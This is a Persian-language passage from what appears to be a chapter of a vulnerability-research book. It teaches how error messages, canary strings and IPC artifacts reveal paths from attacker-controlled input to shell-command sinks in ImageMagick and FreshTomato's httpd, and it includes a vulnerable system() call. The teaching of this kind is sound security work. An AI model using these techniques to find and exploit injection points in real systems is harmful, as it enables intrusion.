به یاد دارید که ImageMagick هنگام اجرا، پیام خطای sh: 1: ffmpeg: not found را خروجی داد؟ این به آن دلیل رخ داد که ffmpeg هنوز در سیستم شما نصب نبود. اما آن پیام خطای ساده دو قطعه اطلاعات مهم به شما داد: اینکه ImageMagick در حال اجرای یک دستور شل است (همان‌طور که sh در پیام خطا نشان می‌دهد) و اینکه دستور شل، ffmpeg را اجرا کرد و بنابراین احتمالاً گزینه‌ها و آرگومان‌های خط فرمان مخصوص ffmpeg را شامل می‌شود.

یک پیام خطا مانند این باید ده‌ها زنگ خطرِ تشخیص باگ را در سر شما به صدا در آورد. اعلان‌های شکست (Failed Assertion) و پیام‌های خطا منابع مهم اطلاعاتی‌اند، زیرا وقتی اتفاقی می‌افتد که نباید می‌افتاد، ظاهر می‌شوند. علاوه بر این، به کمک ردیابی پشته (Stack Trace) یا رشته‌های دیگر در پیام خطا، به شما می‌گویند کجا از کار افتاده است. برای مثال، ما می‌دانیم دستور ffmpeg در اولین خطِ دستوراتِ پاس‌داده‌شده به sh قرار داشت، به دلیل نشانگر 1: در sh: 1: ffmpeg: not found.

در مورد فراخوانی popen در کتابخانه libMagickCore-7.Q16HDRI.so.10.0.1، در Ghidra CodeBrowser می‌توانید شبه‌کد زیر را بیابید که در صورت شکست دستور شل، استثنا (Exception) پرتاب می‌کند:

```text
if ((param_4 == (char *)0x0) || (*param_4 == '\0')) {
    (param_5, "MagickCore/delegate.c", "ExternalDelegateCommand", 0x208, 0x19f,
        "FailedToExecuteCommand", "`%s' (%d)", local_1040, local_106c);
}
```

تابع سفارشی ThrowMagickException آرگومان‌هایی می‌پذیرد که دقیقاً به شما می‌گویند استثنا در کجای کد منبع اصلی رخ می‌دهد و نام تابع اصلی چیست. این الگوی پیام‌های خطا نسبتاً رایج است و سرنخ‌های اضافی درباره هدف واقعی و سازوکار یک تابع فراهم می‌کند.

اعلان‌ها و خطاها همچنین به شما می‌گویند چه انواع بررسی‌های اعتبارسنجی در کجا وجود دارند. تحلیل این مکان‌ها در حین تحلیل ایستا اهمیت دارد تا جامعیت اعتبارسنجی را تأیید و هرگونه دورزدن بالقوه را شناسایی کنید. علاوه بر این، باید تأیید کنید که بررسی‌های اعتبارسنجی در سایر مکان‌های مرتبط به‌درستی اعمال شده‌اند یا خیر.

#### استفاده از رشته‌های قناری (Using Canary Strings)

همان‌طور که در مثال ImageMagick دیدید، رشته‌های قناری می‌توانند به شما کمک کنند مشخص کنید ورودی‌های بالقوه تحت‌کنترل-مهاجم کجا به چاهک‌های بالقوه جریان می‌یابند. وقتی این چاهک‌ها را شناسایی کردید و با تحلیل داینامیک رهگیریشان کردید، می‌توانید به تست جعبه‌خاکستری (Gray-Box) بپردازید: ارسال کاراکترهای کنترلی یا Payloadهای تزریق مختلف و مشاهده نحوه جریان یافتن آن‌ها به چاهک. این برای شناسایی هرگونه پاک‌سازی یا اعتبارسنجی که سر راه باشد، مفید است.

تست مستقیم Payloadها ممکن است سریع‌تر از تحلیل دستی کد پاک‌سازی باشد. برای مثال، اگر به تابع ExternalDelegateCommand در ImageMagick در Ghidra CodeBrowser برگردید، می‌بینید که دستور شل ابتدا از تابع پاک‌سازی زیر عبور می‌کند:

```c
char * SanitizeString(undefined8 param_1)
{
    char *__s;
    size_t sVar1;
    size_t sVar2;
    char *local_20;
    __s = (char *)AcquireString(param_1);
    sVar1 = strlen(__s);
    sVar2 = strspn(__s, allowedCharacters); ❶
    for (local_20 = __s + sVar2; local_20 != __s + sVar1; local_20 = local_20 + sVar2) {
        *local_20 = '_'; ❷
        sVar2 = strspn(local_20, allowedCharacters);
    }
    return __s;
}
```

این تابع صرفاً هر کاراکتری را که در فهرست کاراکترهای مجاز نباشد ❶ (که یک Whitelist به‌شدت بخشنده شامل همه کاراکترهای چاپ‌پذیر است) با زیرخط (_) جایگزین می‌کند ❷. تحلیل دستی چنین تابع پاک‌سازی‌ای ممکن است، اما در مواردی که روتین پیچیده‌تر است یا با روش‌های ایستا دشوارتر مهندسی معکوس می‌شود، رویکرد داینامیک با رشته‌های قناری برای تعیین اینکه مسیر عملی نیست، کافی خواهد بود.

رشته‌های قناری هنگام تحلیل داده‌های لاگ نیز مفیدند. برای مثال، برنامه httpd مربوط به FreshTomato از syslog برای لاگ کردن دستورات شل اجرا‌شده استفاده می‌کند:

```c
snprintf(acStack_360, 0x200, "openssl x509 -in /tmp/openssl/%s.crt -inform PEM -out /tmp/openssl/%s.crt -outform PEM >>/tmp/openssl/openssl.log 2>&1", param_1, param_1);
syslog(4, acStack_360);
system(acStack_360);
```

تطبیق رشته‌های ثابت در پیام‌های لاگ با فراخوانی‌های تابع لاگ در باینری‌ها، تحلیل ایستا و داینامیک شما را به هم پیوند می‌دهد و تلاش‌هایتان را بر جایی متمرکز می‌کند که برنامه واقعاً از ورودیِ تحت‌کنترل-مهاجم استفاده می‌کند.

#### بررسی اثرات ارتباط بین‌پرداختی (Examining Inter-Process Communication Artifacts)

اثرات جانبی تولیدشده توسط یک برنامه می‌توانند اثرات IPC (Inter-Process Communication) مانند فایل‌ها، رجیستری، Named Pipeها و بیشتر بسازند. به‌جای مهندسی معکوس طاقت‌فرسای برنامه برای فهم اینکه آیا ارتباط بین‌پرداختی را به‌صورت امن پیاده کرده است یا خیر، می‌توانید این اثرات را مستقیماً بررسی کنید.

برای مثال، می‌توانید مجوزهای فایل‌ها یا Named Pipeها را بررسی کنید تا پتانسیل بهره‌برداری از آن‌ها را ارزیابی کنید. اگر فایلی در دایرکتوری world-writable ساخته شده باشد، آن را در معرض حمله‌های Symlink قرار می‌دهد.

ابزار مفید در اینجا OleViewDotNet نوشته James Forshaw است (https://github.com/tyranid/oleviewdotnet) که اشیاء Component Object Model ساخته‌شده توسط برنامه‌ها در ویندوز برای ارتباط بین‌پرداختی را فهرست می‌کند. با تحلیل پراپرتی‌های این اشیاء و دستکاری مستقیم آن‌ها، می‌توانید بینش‌هایی به برنامه‌هایی که این اشیاء را در معرض نمایش می‌گذارند به دست آورید.

حتی نحوه ایجاد و دسترسی به این اثرات (برای مثال، استفاده از مسیرهای نسبی یا مطلق) می‌تواند راه‌های اضافی برای حمله پیشنهاد دهد. در چنین موقعیت‌هایی، لاگ‌های رویداد — مانند آنچه Procmon تولید می‌کند — می‌توانند برای شناسایی دسترسی‌های ناموفق به فایل به دلیل مسیرِ ناموجودِ ناشی از مقداری که بالقوه توسط مهاجم قابل کنترل است، مفید باشند.

### خلاصه (Summary)

در این فصل، ابزارهای مختلف تحلیل ایستا و داینامیک را روی FreshTomato و ImageMagick اعمال کردید تا منبع‌ها و چاهک‌های آسیب‌پذیر را شناسایی کنید. فراخوانی‌های کتابخانه‌ای و سیستمی را بررسی کردید تا نقاط تزریق بالقوه برای ورودی‌های تحت‌کنترل-مهاجم را بیابید و در نهایت از آن‌ها بهره‌برداری کردید.

هدف نهایی همان هدف بازبینی کد است، فقط با تاکتیک‌ها و ابزارهای متفاوت: شناسایی مسیرهای قابل بهره‌برداری از منبع‌ها به چاهک‌ها. اگر یک تابع Wrapper خاص حول چاهک خطرناکی به نظر می‌رسد ورودی‌ها را به‌درستی پاک‌سازی و اعتبارسنجی می‌کند، دنبال نمونه‌هایی بگردید که چاهک بدون آن Wrapper فراخوانی شده است. اگر Payloadهای یک منبع به نظر نمی‌رسد به چاهک برسند، بررسی کنید آیا می‌توان بر آن مانع‌ها غلبه کرد. هیچ‌کس نمی‌خواهد روزها را صرف مهندسی معکوس یک کتابخانه رمزنگاری به‌خوبی-محافظت‌شده کند، پس مهم است دامنه جستجویتان را محدود و وقتی واضح است مسیر عملی وجود ندارد، ضرر را متوقف کنید.

هر دو تحلیل ایستا و داینامیک نقش خودشان را در مهندسی معکوس دارند. تحلیل ایستا اغلب زمان‌برتر است اما درک عمیق‌تری می‌دهد از اینکه برنامه با ورودی‌های مشخص در یک نقطه زمانی، چگونه باید رفتار کند. در مقابل، تحلیل داینامیک عکسی فوری از رفتار واقعی برنامه می‌دهد، اما عملی بودن این رویکرد به توانایی شما برای رسیدن و ثبت رفتاری که واقعاً به آن علاقه‌مندید بستگی دارد.

در این فصل، تحلیل ایستا و داینامیک را جداگانه اعمال کردید. در فصل بعد، به اعمال هر دو به‌طور هم‌زمان خواهیم پرداخت.
